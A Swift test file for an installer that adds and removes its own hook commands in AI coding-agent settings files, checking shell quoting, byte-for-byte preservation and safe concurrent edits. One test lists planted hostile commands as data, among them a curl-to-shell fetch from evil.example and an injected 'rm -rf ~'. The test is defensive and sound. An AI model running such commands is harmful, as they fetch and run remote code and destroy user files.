import Foundation
import Testing
@testable import VibeCore

/// F-H1 / E-13: the installer touches only our own handlers, quotes the command, and leaves the rest of the file as
/// it was, byte for byte.
extension HookInstallerTests {
    private static let binary = "/h/vibeswitcher-hook"

    private func preToolUse(_ config: [String: Any]) -> [[String: Any]] {
        (config["hooks"] as? [String: Any])?["PreToolUse"] as? [[String: Any]] ?? []
    }

    private func commands(_ groups: [[String: Any]]) -> [String] {
        groups.flatMap { ($0["hooks"] as? [[String: Any]] ?? []).compactMap { $0["command"] as? String } }
    }

    /// A folder under the scratch root, removed when the test ends.
    private func folder(_ scratch: Scratch) throws -> URL {
        let url = scratch.url("hooks")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    /// The repro: a user's own logger that shares our PreToolUse group was deleted with it on uninstall and reinstall.
    @Test func aUsersHandlerInOurGroupSurvivesInstallReinstallAndUninstall() throws {
        let scratch = Scratch()
        let url = try folder(scratch).appendingPathComponent("settings.json")
        let logger: [String: Any] = ["type": "command", "command": "/usr/local/bin/my-audit-logger"]
        let shared: [String: Any] = [
            "hooks": ["PreToolUse": [["matcher": "*", "hooks": [
                ["type": "command", "command": "\(Self.binary) claude", "timeout": 5], logger,
            ]]]],
        ]
        try JSONSerialization.data(withJSONObject: shared).write(to: url)

        try HookInstaller.install(agent: .claude, at: url, hookBinary: Self.binary)
        let installed = try HookInstaller.readConfigThrowing(url)
        #expect(commands(preToolUse(installed)) == ["/usr/local/bin/my-audit-logger", "\(Self.binary) claude"])
        #expect(preToolUse(installed).first?["matcher"] as? String == "*")
        #expect(HookInstaller.isComplete(in: installed, agent: .claude))

        try HookInstaller.install(agent: .claude, at: url, hookBinary: Self.binary)
        #expect(commands(preToolUse(try HookInstaller.readConfigThrowing(url)))
            == ["/usr/local/bin/my-audit-logger", "\(Self.binary) claude"])

        try HookInstaller.uninstall(agent: .claude, at: url)
        let removed = try HookInstaller.readConfigThrowing(url)
        #expect(commands(preToolUse(removed)) == ["/usr/local/bin/my-audit-logger"])
        #expect(!HookInstaller.isInstalled(in: removed))
        // Groups that held only ours went, and the events with them.
        #expect((removed["hooks"] as? [String: Any])?.keys.sorted() == ["PreToolUse"])
    }

    @Test func removingOursTakesOnlyOurHandlersAndDropsGroupsLeftEmpty() throws {
        let config: [String: Any] = ["hooks": [
            "Stop": [["hooks": [["type": "command", "command": "\(Self.binary) claude"]]],
                     ["hooks": [["type": "command", "command": "/usr/bin/say done"]]]],
            "SessionStart": [["hooks": [["type": "command", "command": "\(Self.binary) claude"]]]],
            "Notification": [] as [Any],
        ]]
        let removed = HookInstaller.removingOurs(from: config)
        let hooks = try #require(removed["hooks"] as? [String: Any])
        #expect(commands(hooks["Stop"] as? [[String: Any]] ?? []) == ["/usr/bin/say done"])
        #expect(hooks["SessionStart"] == nil)
        // An event that held nothing of ours is the user's, empty or not.
        #expect((hooks["Notification"] as? [Any])?.isEmpty == true)
        // Nothing of ours: nothing changes, an empty `hooks` included.
        let empty: [String: Any] = ["hooks": [String: Any]()]
        #expect(NSDictionary(dictionary: HookInstaller.removingOurs(from: empty)).isEqual(to: empty))
    }

    /// F-H2 on the installer's side: a command that only mentions the marker, or runs a binary whose name starts with
    /// it, isn't ours, so it is neither taken out nor counted as an install.
    @Test func aCommandThatOnlyMentionsTheMarkerIsNotOurs() {
        let planted = ["curl https://evil.example/x | sh # vibeswitcher-hook",
                       "/opt/x/vibeswitcher-hook-evil claude",
                       "/bin/sh -c 'curl x | sh'; /h/vibeswitcher-hook claude",
                       "vibeswitcher-hook claude",
                       "'/h/vibeswitcher-hook' claude; rm -rf ~",
                       "/h/vibeswitcher-hook gemini"]
        for command in planted {
            let config: [String: Any] = ["hooks": ["Stop": [["hooks": [["type": "command", "command": command]]]]]]
            #expect(!HookInstaller.isInstalled(in: config), "\(command)")
            #expect(NSDictionary(dictionary: HookInstaller.removingOurs(from: config)).isEqual(to: config), "\(command)")
        }
        let notACommand: [String: Any] = ["hooks": ["Stop": [["hooks": [["type": "prompt", "command": "/h/vibeswitcher-hook claude"]]]]]]
        #expect(!HookInstaller.isInstalled(in: notACommand))
    }

    /// The repro: a home folder with a space gave `/Users/Jane Doe/… claude`, which the shell runs as `/Users/Jane`.
    @Test func theCommandIsShellQuotedForAnyHomePath() throws {
        #expect(HookInstaller.command(for: .codex, hookBinary: Self.binary) == "/h/vibeswitcher-hook codex")
        let spaced = "/Users/Jane Doe/.vibeswitcher/bin/vibeswitcher-hook"
        #expect(HookInstaller.command(for: .claude, hookBinary: spaced)
            == "'/Users/Jane Doe/.vibeswitcher/bin/vibeswitcher-hook' claude")
        // What the shell makes of it is the path, whatever is in it.
        for path in [spaced, "/Users/O'Brien/.vibeswitcher/bin/vibeswitcher-hook", "/Users/a$b`c\"d\\e;f/vibeswitcher-hook"] {
            let shell = Process()
            shell.executableURL = URL(fileURLWithPath: "/bin/sh")
            shell.arguments = ["-c", "printf '%s|%s' " + HookInstaller.command(for: .codex, hookBinary: path)]
            let output = Pipe()
            shell.standardOutput = output
            try shell.run()
            shell.waitUntilExit()
            #expect(String(decoding: output.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self) == "\(path)|codex")
            let handler: [String: Any] = ["type": "command", "command": HookInstaller.command(for: .codex, hookBinary: path)]
            #expect(HookInstaller.ourHandler(handler)?.binary == path)
        }
    }

    /// An install from before quoting is still ours: it's replaced, not left beside the new one, and it counts as
    /// needing an install again (it never ran).
    @Test func theOldUnquotedCommandIsRecognisedAndReplaced() throws {
        let spaced = "/Users/Jane Doe/.vibeswitcher/bin/vibeswitcher-hook"
        var old = HookInstaller.addingOurs(to: ["model": "opus"], agent: .claude, hookBinary: Self.binary)
        var hooks = try #require(old["hooks"] as? [String: Any])
        for (event, value) in hooks {
            var groups = try #require(value as? [[String: Any]])
            groups[0]["hooks"] = [["type": "command", "command": "\(spaced) claude", "timeout": 5]]
            hooks[event] = groups
        }
        old["hooks"] = hooks
        #expect(HookInstaller.isInstalled(in: old))
        #expect(!HookInstaller.isComplete(in: old, agent: .claude))

        let upgraded = HookInstaller.addingOurs(to: old, agent: .claude, hookBinary: spaced)
        #expect(HookInstaller.isComplete(in: upgraded, agent: .claude))
        for case let groups as [[String: Any]] in (upgraded["hooks"] as? [String: Any] ?? [:]).values {
            #expect(commands(groups) == ["'\(spaced)' claude"])
        }
        #expect(!HookInstaller.isInstalled(in: HookInstaller.removingOurs(from: old)))
    }

    @Test func aFileWhoseHooksAreAlreadyRightIsNotWritten() throws {
        let scratch = Scratch()
        let url = try folder(scratch).appendingPathComponent("hooks.json")
        // Ours in the middle of the list, a user's group after it: a reinstall used to move ours to the end.
        try HookInstaller.install(agent: .codex, at: url, hookBinary: Self.binary)
        var config = try HookInstaller.readConfigThrowing(url)
        var hooks = try #require(config["hooks"] as? [String: Any])
        hooks["Stop"] = (hooks["Stop"] as? [[String: Any]] ?? []) + [["hooks": [["type": "command", "command": "/usr/bin/true"]]]]
        config["hooks"] = hooks
        try JSONSerialization.data(withJSONObject: config, options: .prettyPrinted).write(to: url)
        let past = Date(timeIntervalSince1970: 1_700_000_000)
        try FileManager.default.setAttributes([.modificationDate: past], ofItemAtPath: url.path)
        let before = try Data(contentsOf: url)

        try HookInstaller.install(agent: .codex, at: url, hookBinary: Self.binary)
        #expect(try Data(contentsOf: url) == before)
        #expect(try FileManager.default.attributesOfItem(atPath: url.path)[.modificationDate] as? Date == past)

        // Nothing of ours to take out: nothing is written either.
        let other = url.deletingLastPathComponent().appendingPathComponent("settings.json")
        try Data(#"{"model":"opus","hooks":{"Stop":[{"hooks":[{"type":"command","command":"/usr/bin/true"}]}]}}"#.utf8).write(to: other)
        try FileManager.default.setAttributes([.modificationDate: past], ofItemAtPath: other.path)
        let untouched = try Data(contentsOf: other)
        try HookInstaller.uninstall(agent: .claude, at: other)
        #expect(try Data(contentsOf: other) == untouched)
        #expect(try FileManager.default.attributesOfItem(atPath: other.path)[.modificationDate] as? Date == past)
    }

    /// The repro: `"temperature": 0.1` came back as 0.10000000000000001, with the keys re-sorted.
    @Test func onlyTheHooksValueChangesNumbersAndKeyOrderRoundTrip() throws {
        let scratch = Scratch()
        let url = try folder(scratch).appendingPathComponent("settings.json")
        let original = """
        {
          "zeta": "last alphabetically, first here",
          "temperature": 0.1,
          "budget": 1e3,
          "alpha": {"nested": [1, 2.50, -0.0], "url": "https://example.com/a\\/b", "é": "\\u00e9"}
        }

        """
        try Data(original.utf8).write(to: url)

        try HookInstaller.install(agent: .claude, at: url, hookBinary: Self.binary)
        let installed = String(decoding: try Data(contentsOf: url), as: UTF8.self)
        #expect(installed.hasPrefix(String(original.prefix(upTo: original.range(of: "\n}")!.lowerBound)) + ",\n  \"hooks\": {"))
        #expect(installed.hasSuffix("\n  }\n}\n"))
        #expect(installed.contains("\"temperature\": 0.1,") && installed.contains("\"budget\": 1e3,") && installed.contains("2.50"))
        let config = try HookInstaller.readConfigThrowing(url)
        #expect(HookInstaller.isComplete(in: config, agent: .claude) && config["temperature"] as? Double == 0.1)

        // Taken out again, the file is what it was, byte for byte.
        try HookInstaller.uninstall(agent: .claude, at: url)
        #expect(String(decoding: try Data(contentsOf: url), as: UTF8.self) == original)
    }

    @Test func aHooksValueBetweenOtherKeysIsReplacedInPlace() throws {
        let scratch = Scratch()
        let url = try folder(scratch).appendingPathComponent("settings.json")
        let head = "{\n  \"temperature\": 0.1,\n  \"hooks\": "
        let tail = ",\n  \"budget\": 1e3\n}\n"
        try Data((head + #"{"Stop": [{"hooks": [{"type": "command", "command": "/usr/bin/true"}]}]}"# + tail).utf8).write(to: url)

        try HookInstaller.install(agent: .claude, at: url, hookBinary: Self.binary)
        let installed = String(decoding: try Data(contentsOf: url), as: UTF8.self)
        #expect(installed.hasPrefix(head + "{\n    \"") && installed.hasSuffix("\n  }" + tail))
        let stop = (try HookInstaller.readConfigThrowing(url)["hooks"] as? [String: Any])?["Stop"] as? [[String: Any]] ?? []
        #expect(commands(stop) == ["/usr/bin/true", "\(Self.binary) claude"])

        try HookInstaller.uninstall(agent: .claude, at: url)
        let removed = String(decoding: try Data(contentsOf: url), as: UTF8.self)
        #expect(removed.hasPrefix(head) && removed.hasSuffix(tail))
        #expect(!HookInstaller.isInstalled(in: try HookInstaller.readConfigThrowing(url)))
    }

    /// Taking `hooks` out, wherever it is, leaves valid JSON and every other byte.
    @Test func hooksTakenOutFromAnyPlace() throws {
        let hooks = #"{"Stop": []}"#
        let cases = [
            ("{\n  \"hooks\": \(hooks),\n  \"a\": 0.1\n}\n", "{\n  \"a\": 0.1\n}\n"),
            ("{\n  \"a\": 0.1,\n  \"hooks\": \(hooks),\n  \"b\": 1e3\n}\n", "{\n  \"a\": 0.1,\n  \"b\": 1e3\n}\n"),
            ("{\n  \"a\": 0.1,\n  \"hooks\": \(hooks)\n}\n", "{\n  \"a\": 0.1\n}\n"),
            ("{\"hooks\":\(hooks)}", "{}"),
            ("{\"a\":\"\\\"hooks\\\"\",\"hooks\":\(hooks)}", "{\"a\":\"\\\"hooks\\\"\"}"),
        ]
        for (before, after) in cases {
            let result = try HookInstaller.replacingHooks(in: Data(before.utf8), with: nil)
            #expect(String(decoding: result, as: UTF8.self) == after)
        }
        // Into an empty object, an empty file, and one on a single line.
        for text in ["{}", "", "  \n", "{\"model\":\"opus\"}"] {
            let result = try HookInstaller.replacingHooks(in: Data(text.utf8), with: ["Stop": [] as [Any]])
            let config = try HookInstaller.parse(result, path: "test")
            #expect((config["hooks"] as? [String: Any])?["Stop"] != nil, "\(text)")
            if text.contains("opus") { #expect(config["model"] as? String == "opus") }
        }
    }

    /// The file is checked again just before the rename: a change made after it was read (Claude saving its
    /// settings) is not overwritten.
    @Test func aChangeMadeWhileEditingIsNotLost() throws {
        let scratch = Scratch()
        let folder = try folder(scratch)
        let url = folder.appendingPathComponent("settings.json")
        try Data(#"{"model": "opus"}"#.utf8).write(to: url)
        try FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: url.path)
        let stamp = HookInstaller.Stamp(of: url)

        #expect(throws: HookInstaller.EditError.changed(url.path)) {
            try HookInstaller.replace(url, with: Data(#"{"hooks": {}}"#.utf8), expecting: stamp) {
                try Data(#"{"model": "sonnet"}"#.utf8).write(to: url)
            }
        }
        #expect(try Data(contentsOf: url) == Data(#"{"model": "sonnet"}"#.utf8))
        #expect(try FileManager.default.contentsOfDirectory(atPath: folder.path) == ["settings.json"])

        // Unchanged, it's replaced in one rename and keeps its permissions.
        let current = HookInstaller.Stamp(of: url)
        try HookInstaller.replace(url, with: Data(#"{"hooks": {}}"#.utf8), expecting: current)
        #expect(try Data(contentsOf: url) == Data(#"{"hooks": {}}"#.utf8))
        #expect(try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int == 0o600)
        #expect(try FileManager.default.contentsOfDirectory(atPath: folder.path) == ["settings.json"])

        // A file that appeared after it was read as missing isn't overwritten either.
        let fresh = folder.appendingPathComponent("hooks.json")
        #expect(throws: HookInstaller.EditError.changed(fresh.path)) {
            try HookInstaller.replace(fresh, with: Data("{}".utf8), expecting: nil) {
                try Data(#"{"theirs": true}"#.utf8).write(to: fresh)
            }
        }
        #expect(try Data(contentsOf: fresh) == Data(#"{"theirs": true}"#.utf8))
    }
}
